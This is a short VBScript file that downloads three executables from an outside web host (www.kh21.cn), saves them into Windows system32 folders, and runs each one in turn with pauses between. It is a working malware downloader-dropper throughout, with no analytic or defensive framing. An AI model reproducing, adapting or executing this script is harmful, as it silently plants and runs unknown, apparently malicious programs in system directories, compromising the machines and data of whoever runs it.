Set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://www.kh21.cn/xuke/a/ClickerAgent(yz0001)a.exe",0 
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "C:\WINDOWS\system32\ClickerAgent(yz0001)a.exe",2 
Set objShell = CreateObject("Wscript.Shell") 
objshell.run """C:\WINDOWS\system32\ClickerAgent(yz0001)a.exe"""

WScript.Sleep 8000

Set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://www.kh21.cn/xuke/a/yua.exe",0 
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "C:\WINDOWS\system32\yua.exe",2 
Set objShell = CreateObject("Wscript.Shell") 
objshell.run """C:\WINDOWS\system32\yua.exe"""

WScript.Sleep 10000

Set Aost = createObject("Microsoft.XMLHTTP") 
Aost.Open "GET","http://www.kh21.cn/xuke/a/1001a.exe",0 
Aost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(Aost.responseBody) 
sGet.SaveToFile "C:\WINDOWS\system32\config\1001a.exe",2 
Set objShell = CreateObject("Wscript.Shell") 
objshell.run """C:\WINDOWS\system32\config\1001a.exe"""